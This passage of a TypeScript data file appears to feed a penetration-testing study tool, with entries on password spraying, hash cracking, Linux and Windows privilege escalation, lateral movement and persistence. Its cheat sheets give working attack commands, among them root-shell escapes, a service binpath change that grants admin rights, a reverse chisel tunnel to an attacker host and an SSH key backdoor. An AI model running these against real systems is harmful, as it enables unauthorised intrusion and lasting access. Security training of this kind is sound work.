      "Password spraying involves attempting a single common password (e.g. 'SeasonYear!', 'Company123!') across a wide list of confirmed usernames, contrasting with brute-forcing which tries many passwords against one account. This approach bypasses standard account lockout thresholds while frequently yielding access to weak accounts.",
    category: "techniques",
    targetPhase: "exploitation",
    tags: ["Authentication", "Active Directory", "SMB", "SSH"],
    tools: [
      {
        name: "crackmapexec",
        category: "AD / SMB",
        purpose: "Password spray SMB, WinRM, and LDAP with automatic lockout tracking",
        commonCommands: ["crackmapexec smb $TARGET -u users.txt -p 'Spring2024!' --continue-on-success"],
      },
      {
        name: "hydra",
        category: "Network Login",
        purpose: "Multi-protocol parallel login brute forcer for web, SSH, FTP, and SMB",
        commonCommands: ["hydra -L users.txt -p 'Password123' ssh://$TARGET -t 4"],
      },
    ],
    cheatsheet: [
      {
        title: "Spray Single Password via CrackMapExec",
        command: "crackmapexec smb $TARGET -u usernames.txt -p 'Winter2024!'",
        description: "Sprays one password across all mapped users; green '[+]' indicates valid login, 'Pwn3d!' indicates local admin.",
      },
    ],
    relatedSlugs: ["credential-analysis", "smb", "ssh"],
    checks: [
      {
        semanticKey: "technique.password-spraying.gather-users",
        title: "Compile confirmed usernames before spraying",
        description: "Extract verified usernames from web comments, LDAP, SMTP, or email metadata.",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "technique.password-spraying.spray-execution",
        title: "Execute single password cycle with rate limiting",
        description: "Test only seasonal or default passwords with delay intervals between attempts.",
        priority: "required",
        sortOrder: 2,
      },
    ],
  },
  {
    id: "tech-hash-cracking",
    slug: "hash-cracking",
    title: "Offline Hash Cracking",
    subtitle: "GPU and CPU acceleration for recovering plaintext passwords from cryptographic hashes",
    description: "Rules, wordlists, and mask attacks for cracking NTLM, SHA-512 crypt, bcrypt, and database hashes.",
    about:
      "Offline hash cracking allows an attacker to compute billions of guesses per second against recovered hashes without interacting with the target system or generating network noise. Using tools like Hashcat with wordlists (rockyou.txt) and rule engines (OneRuleToRuleThemAll) reveals original plaintext passwords.",
    category: "techniques",
    targetPhase: "exploitation",
    tags: ["Passwords", "Hashcat", "John", "Offline"],
    tools: [
      {
        name: "hashcat",
        category: "GPU Cracker",
        purpose: "Industry standard GPU-accelerated hash cracker supporting hundreds of hash modes",
        commonCommands: ["hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule"],
      },
      {
        name: "john",
        category: "CPU Cracker",
        purpose: "Flexible password cracker with automatic format detection and rich script extraction tools",
        commonCommands: ["john --wordlist=rockyou.txt hashes.txt"],
      },
    ],
    cheatsheet: [
      {
        title: "Crack NTLM Hashes with Hashcat",
        command: "hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt",
        description: "Mode 1000 specifies NTLM; -a 0 indicates dictionary attack using rockyou.txt.",
      },
      {
        title: "Crack Linux SHA-512 Shadow Hashes ($6$)",
        command: "hashcat -m 1800 -a 0 shadow_hashes.txt /usr/share/wordlists/rockyou.txt",
        description: "Mode 1800 targets standard Linux /etc/shadow salted SHA-512 hashes.",
      },
    ],
    relatedSlugs: ["credential-analysis", "password-spraying"],
    checks: [
      {
        semanticKey: "technique.hash-cracking.format-verification",
        title: "Verify exact hash type and mode identifier",
        description: "Confirm whether the hash is raw MD5 (0), NTLM (1000), SHA-256 (1400), or Linux shadow (1800).",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "technique.hash-cracking.dictionary-attack",
        title: "Execute standard dictionary attack with rockyou.txt",
        description: "Run first-pass wordlist attack before applying complex mangling rules or masks.",
        priority: "required",
        sortOrder: 2,
      },
    ],
  },
];

export const standalonePostExploitation: readonly KnowledgeItem[] = [
  {
    id: "post-sudo-privesc",
    slug: "sudo-privesc",
    title: "Sudo Privileges & Misconfigurations",
    subtitle: "Privilege escalation through sudoers rules, environment overrides, and GTFOBins",
    description: "Auditing sudo permissions for commands that can spawn shells or read sensitive files as root.",
    about:
      "Sudo (superuser do) delegates administrator authority to specific users for specific commands. Misconfigured sudoers rules frequently grant permission to execute binaries with built-in shell escape capabilities (e.g. vim, less, tar, find, python) or permit dangerous environment variables (LD_PRELOAD, LD_LIBRARY_PATH) which allow instantaneous elevation to root.",
    category: "post_exploitation",
    targetPhase: "post-exploitation",
    tags: ["Linux", "Privesc", "Sudo", "GTFOBins"],
    tools: [
      {
        name: "sudo",
        category: "System Command",
        purpose: "Query allowed commands and execution parameters",
        commonCommands: ["sudo -l"],
      },
    ],
    cheatsheet: [
      {
        title: "List Current User Sudo Rights",
        command: "sudo -l",
        description: "Displays permitted binaries, NOPASSWD flags, and env_keep settings.",
      },
      {
        title: "GTFOBins Vim Sudo Shell Escape",
        command: "sudo vim -c ':!/bin/sh'",
        description: "Escapes from vim into a root shell when vim is permitted in sudoers.",
      },
      {
        title: "Exploit LD_PRELOAD in Sudoers",
        command: "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c\nsudo LD_PRELOAD=/tmp/preload.so /allowed/binary",
        description: "When env_keep+=LD_PRELOAD is set, custom shared libraries can inject code executed as root.",
      },
    ],
    relatedSlugs: ["linux-post-exploitation", "suid-privesc", "linux-capabilities"],
    checks: [
      {
        semanticKey: "post.sudo.check-list",
        title: "Run sudo -l and parse allowed commands",
        description: "Inspect specific binaries, wildcards, and user impersonation options (ALL:ALL).",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "post.sudo.gtfobins-lookup",
        title: "Check discovered binaries against GTFOBins",
        description: "Search GTFOBins for shell escape flags, file read parameters, or write options.",
        priority: "required",
        sortOrder: 2,
      },
    ],
  },
  {
    id: "post-suid-privesc",
    slug: "suid-privesc",
    title: "SUID / SGID Binary Exploitation",
    subtitle: "Escalating privileges via binaries configured with the Set-UID execution bit",
    description: "Searching for custom or vulnerable binaries executing with the privileges of their owner.",
    about:
      "When the SetUID (SUID) bit is applied to an executable file (chmod u+s), the process runs with the file owner's privileges (typically root) regardless of who invokes it. If a SUID binary has known shell escape features, executes external scripts via relative paths, or suffers from buffer overflows, low-privilege users can elevate to root.",
    category: "post_exploitation",
    targetPhase: "post-exploitation",
    tags: ["Linux", "Privesc", "SUID", "GTFOBins"],
    tools: [
      {
        name: "find",
        category: "System Utility",
        purpose: "Locate all files with SUID permissions",
        commonCommands: ["find / -perm -4000 -type f 2>/dev/null"],
      },
    ],
    cheatsheet: [
      {
        title: "Find All SUID Executables",
        command: "find / -perm -u=s -type f 2>/dev/null",
        description: "Scans entire filesystem and prints absolute paths to every SUID binary.",
      },
      {
        title: "Analyze SUID Binary Strings for Hardcoded Paths",
        command: "strings /path/to/binary | grep -E 'sh|bash|cat|system|chmod'",
        description: "Checks if the binary calls system commands without absolute paths (vulnerable to PATH hijacking).",
      },
    ],
    relatedSlugs: ["linux-post-exploitation", "sudo-privesc", "linux-capabilities"],
    checks: [
      {
        semanticKey: "post.suid.scan-system",
        title: "Execute filesystem scan for SUID files",
        description: "Enumerate all executables with 4000 permission bit set.",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "post.suid.baseline-diff",
        title: "Compare SUID list against standard distro binaries",
        description: "Differentiate default utilities (ping, passwd) from unusual or custom compiled binaries.",
        priority: "required",
        sortOrder: 2,
      },
    ],
  },
  {
    id: "post-linux-capabilities",
    slug: "linux-capabilities",
    title: "Linux Capabilities Exploitation",
    subtitle: "Bypassing privilege boundaries through granular kernel permissions",
    description: "Auditing POSIX capabilities (cap_setuid, cap_net_raw, cap_dac_read_search) assigned to binaries.",
    about:
      "Linux capabilities divide traditional all-or-nothing root privileges into distinct units. If a binary is granted 'cap_setuid+ep', any user executing it can invoke setuid(0) to gain a root shell. These permissions do not show up as standard SUID bits and are often overlooked during manual reviews.",
    category: "post_exploitation",
    targetPhase: "post-exploitation",
    tags: ["Linux", "Privesc", "Capabilities", "Kernel"],
    tools: [
      {
        name: "getcap",
        category: "System Utility",
        purpose: "Inspect extended attributes for assigned capabilities",
        commonCommands: ["getcap -r / 2>/dev/null"],
      },
    ],
    cheatsheet: [
      {
        title: "Recursive Capability Scan",
        command: "getcap -r / 2>/dev/null",
        description: "Scans all binaries on disk and lists their configured capabilities.",
      },
      {
        title: "Exploit cap_setuid in Python",
        command: "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
        description: "If python has cap_setuid+ep capability, this spawns an immediate root shell.",
      },
    ],
    relatedSlugs: ["linux-post-exploitation", "suid-privesc", "sudo-privesc"],
    checks: [
      {
        semanticKey: "post.capabilities.scan",
        title: "Run recursive capability audit using getcap",
        description: "Audit all binaries with extended capability attributes on the target host.",
        priority: "required",
        sortOrder: 1,
      },
    ],
  },
  {
    id: "post-cron-privesc",
    slug: "cron-privesc",
    title: "Cron Jobs & Scheduled Tasks",
    subtitle: "Privilege escalation through periodic root tasks, writable scripts, and wildcards",
    description: "Inspecting crontabs, /etc/cron.* folders, and active background timers for writable targets.",
    about:
      "Linux cron daemons execute background tasks as root at scheduled intervals. If a cron job executes a script that is writable by low-privilege users, references a missing path, or uses shell wildcards ('*') inside tar or rsync commands, an attacker can hijack the job to execute arbitrary commands as root.",
    category: "post_exploitation",
    targetPhase: "post-exploitation",
    tags: ["Linux", "Cron", "Privesc", "Automation"],
    tools: [
      {
        name: "pspy",
        category: "Process Monitor",
        purpose: "Snoop running processes in userland without root to catch periodic cron executions",
        commonCommands: ["./pspy64 -pf -i 1000"],
      },
    ],
    cheatsheet: [
      {
        title: "Inspect System-Wide Crontab",
        command: "cat /etc/crontab /etc/cron.*/* 2>/dev/null",
        description: "Inspects system scheduled tasks to find jobs running as root.",
      },
      {
        title: "Check Writable Files in Cron Scripts",
        command: "ls -la /etc/cron.d/ /var/spool/cron/crontabs/",
        description: "Verifies file permissions to identify any writable cron configuration.",
      },
    ],
    relatedSlugs: ["linux-post-exploitation", "sudo-privesc"],
    checks: [
      {
        semanticKey: "post.cron.check-tables",
        title: "Review /etc/crontab and /etc/cron.* entries",
        description: "Check task timing, running user, and target script permissions.",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "post.cron.pspy-monitor",
        title: "Monitor process executions with pspy",
        description: "Observe repetitive short-lived processes running with UID 0.",
        priority: "recommended",
        sortOrder: 2,
      },
    ],
  },
  {
    id: "post-service-misconfig",
    slug: "service-misconfig",
    title: "Windows Service Misconfigurations",
    subtitle: "Privilege escalation via unquoted service paths, weak permissions, and binary replacement",
    description: "Exploiting insecure Windows service definitions and file system ACLs.",
    about:
      "Windows services running as SYSTEM can be manipulated if their configuration contains flaws. Key vectors include Unquoted Service Paths (where spaces in folder names permit placing an executable like 'Program.exe'), Insecure Service Permissions (where users can change binpath via 'sc config'), or Writable Service Binaries.",
    category: "post_exploitation",
    targetPhase: "post-exploitation",
    tags: ["Windows", "Services", "Privesc", "ACLs"],
    tools: [
      {
        name: "sc.exe",
        category: "Service Controller",
        purpose: "Query and reconfigure Windows service binary paths and startup modes",
        commonCommands: ["sc qc ServiceName", "sc config ServiceName binpath= \"C:\\evil.exe\""],
      },
      {
        name: "accesschk.exe",
        category: "Sysinternals",
        purpose: "Audit file and service permissions for current user groups",
        commonCommands: ["accesschk.exe -uwcqv \"Users\" *"],
      },
    ],
    cheatsheet: [
      {
        title: "Reconfigure Service Binpath via SC",
        command: "sc config VulnService binPath= \"cmd.exe /k net localgroup administrators user /add\"\nsc stop VulnService\nsc start VulnService",
        description: "If current user has SERVICE_CHANGE_CONFIG permission, reconfigures service to grant admin rights.",
      },
    ],
    relatedSlugs: ["windows-post-exploitation", "smb"],
    checks: [
      {
        semanticKey: "post.service.audit-permissions",
        title: "Query service permissions with accesschk or powerup",
        description: "Inspect Windows services where Users group has write or configuration privileges.",
        priority: "required",
        sortOrder: 1,
      },
    ],
  },
];

export const standaloneConcepts: readonly KnowledgeItem[] = [
  {
    id: "concept-enumeration",
    slug: "enumeration",
    title: "Methodical Enumeration",
    subtitle: "The foundational discipline of cybersecurity: evidence before assumption",
    description: "Why exhaustive, structured enumeration always outperforms opportunistic guessing.",
    about:
      "Enumeration is the disciplined process of discovering, verifying, and recording the complete attack surface of a target system. Rather than rushing to run automated exploits or guessing credentials, skilled security professionals methodically map services, technology versions, endpoints, and access controls. Every valid attack path begins with thorough enumeration.",
    category: "concepts",
    targetPhase: "reconnaissance",
    tags: ["Methodology", "PTES", "Core Concept", "Reconnaissance"],
    tools: [],
    cheatsheet: [
      {
        title: "Standard Port Scanning Pipeline",
        command: "nmap -p- --min-rate 1000 -sS -oN ports.nmap $TARGET\nnmap -p $OPEN_PORTS -sC -sV -oN services.nmap $TARGET",
        description: "Fast two-stage scanning: first identify all open ports, then run deep script and version inspection on active ports only.",
      },
    ],
    relatedSlugs: ["http", "privilege-escalation"],
    checks: [
      {
        semanticKey: "concept.enumeration.breadth-first",
        title: "Complete full-port discovery before deep inspection",
        description: "Ensure all 65,535 TCP ports and top UDP ports have been probed.",
        priority: "required",
        sortOrder: 1,
      },
      {
        semanticKey: "concept.enumeration.record-evidence",
        title: "Record observed banners and proof for every finding",
        description: "Attach concrete evidence (banners, headers, response status) before inferring vulnerabilities.",
        priority: "required",
        sortOrder: 2,
      },
    ],
  },
  {
    id: "concept-privilege-escalation",
    slug: "privilege-escalation",
    title: "Privilege Escalation Vectors",
    subtitle: "Architectural mechanisms governing vertical and horizontal privilege elevation",
    description: "Understanding how system boundaries, trust relationships, and permissions collapse.",
    about:
      "Privilege escalation occurs when a user obtains access rights beyond their intended security authorization. Vertical escalation moves from a low-privilege user to an administrative authority (root or SYSTEM), while horizontal escalation gains access to peer accounts with different permissions or file access.",
    category: "concepts",
    targetPhase: "post-exploitation",
    tags: ["Privesc", "Security Model", "Post Exploitation", "Access Control"],
    tools: [],
    cheatsheet: [
      {
        title: "Linux Fast Triage Sequence",
        command: "id && sudo -l && uname -a && find / -perm -4000 -type f 2>/dev/null",
        description: "Quick one-line initial triage command executed upon gaining a Linux shell.",
      },
      {
        title: "Windows Fast Triage Sequence",
        command: "whoami /all & net user & systeminfo",
        description: "Quick initial triage command executed upon gaining a Windows command prompt.",
      },
    ],
    relatedSlugs: ["linux-post-exploitation", "windows-post-exploitation", "sudo-privesc"],
    checks: [
      {
        semanticKey: "concept.privesc.situational-awareness",
        title: "Establish situational awareness immediately upon access",
        description: "Identify current user, system architecture, OS version, and network configuration.",
        priority: "required",
        sortOrder: 1,
      },
    ],
  },
  {
    id: "concept-lateral-movement",
    slug: "lateral-movement",
    title: "Lateral Movement Fundamentals",
    subtitle: "Pivoting across network segments and leveraging internal trust relationships",
    description: "Techniques for traversing internal subnets, port forwarding, and credential reuse.",
    about:
      "Lateral movement is the progression from one compromised host to adjacent systems within the target network. Attackers achieve this by extracting stored SSH keys, harvesting network credentials, establishing SSH dynamic tunnels (SOCKS proxies) or using tools like Chisel to reach internal services that are inaccessible from the internet.",
    category: "concepts",
    targetPhase: "post-exploitation",
    tags: ["Pivoting", "Networking", "Tunneling", "Post Exploitation"],
    tools: [
      {
        name: "chisel",
        category: "TCP/UDP Tunnel",
        purpose: "Fast TCP/UDP tunnel over HTTP secured via SSH",
        commonCommands: ["./chisel server -p 8000 --reverse", "./chisel client $ATTACKER:8000 R:socks"],
      },
      {
        name: "ssh",
        category: "Tunneling",
        purpose: "Dynamic port forwarding creating local SOCKS5 proxy",
        commonCommands: ["ssh -D 1080 -N -f user@$TARGET"],
      },
    ],
    cheatsheet: [
      {
        title: "SSH Dynamic SOCKS5 Proxy",
        command: "ssh -D 1080 -N -C -q user@$TARGET",
        description: "Creates a local SOCKS5 proxy on port 1080 routing traffic into the target network.",
      },
      {
        title: "Proxychains Routing Configuration",
        command: "proxychains nmap -sT -p 80,445,3389 192.168.1.10",
        description: "Routes tools through SOCKS proxy to scan internal target networks.",
      },
    ],
    relatedSlugs: ["ssh", "smb", "enumeration"],
    checks: [
      {
        semanticKey: "concept.lateral.network-interfaces",
        title: "Enumerate internal IP interfaces and ARP tables",
        description: "Run 'ip a' / 'arp -a' to identify secondary network subnets and active neighbors.",
        priority: "required",
        sortOrder: 1,
      },
    ],
  },
  {
    id: "concept-persistence",
    slug: "persistence",
    title: "Persistence Mechanisms",
    subtitle: "Techniques for maintaining reliable, persistent access across restarts and credential changes",
    description: "SSH keys, startup scripts, registry run keys, and scheduled tasks used to maintain foothold.",
    about:
      "Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. In penetration testing, understanding persistence ensures that security teams can identify planted backdoors during post-engagement remediation.",
    category: "concepts",
    targetPhase: "post-exploitation",
    tags: ["Post Exploitation", "Persistence", "Forensics"],
    tools: [],
    cheatsheet: [
      {
        title: "Authorized Keys Persistence",
        command: "echo '$PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
        description: "Adds attacker public key to target user's authorized_keys for permanent passwordless SSH access.",
      },
    ],
    relatedSlugs: ["ssh", "linux-post-exploitation", "windows-post-exploitation"],
    checks: [
      {
        semanticKey: "concept.persistence.audit-keys",
        title: "Audit authorized_keys and known hosts files",
        description: "Review SSH keys and identities permitted to log into the system.",
        priority: "recommended",
        sortOrder: 1,
      },
    ],
  },
  {
    id: "concept-logs-forensics",
    slug: "logs-forensics",
    title: "Logs & Defensive Forensics",
    subtitle: "Understanding the digital footprint left by penetration testing activities",
    description: "Interpreting syslog, auth.log, Windows Event Logs, and web server access logs.",
    about:
      "Every penetration testing action leaves traces in system logs: failed login attempts in /var/log/auth.log, high-frequency HTTP requests in access.log, and process creation events in Windows Security Event Log (Event ID 4688). Analyzing these logs helps testers understand detection thresholds and provide actionable defense recommendations.",
    category: "concepts",
    targetPhase: "post-exploitation",
    tags: ["Forensics", "Blue Team", "Logs", "Detection"],
    tools: [],
    cheatsheet: [
      {
        title: "Monitor Linux Authentication Log Live",
        command: "tail -f /var/log/auth.log | grep -E 'sshd|sudo'",
        description: "Follows authentication events, failed passwords, and sudo executions in real-time.",
      },
    ],
    relatedSlugs: ["enumeration", "linux-post-exploitation"],
    checks: [
      {
        semanticKey: "concept.logs.review-auth",
        title: "Review auth logs for recorded test footprints",
        description: "Identify which actions triggered high-severity log events or alerts.",
        priority: "recommended",
        sortOrder: 1,
      },
    ],
  },
];
